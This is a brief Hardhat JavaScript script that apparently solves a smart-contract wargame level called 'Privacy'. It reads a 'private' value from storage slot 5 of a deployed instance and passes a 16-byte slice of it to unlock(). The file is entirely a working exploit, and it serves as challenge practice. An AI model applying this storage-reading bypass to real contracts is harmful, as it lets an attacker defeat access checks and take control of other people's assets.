const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0xF68b5b4F3cEF71be1B4c229d0032182e69Aae065";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("Privacy");
  const contract = Contract.attach(instanceAddress);

  // Attack

  // data[2] is located at storage slot 5
  const data2 = await ethers.provider.getStorageAt(instanceAddress, 5);

  const slicedData2 = data2.slice(0, 34);

  await contract.unlock(slicedData2);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
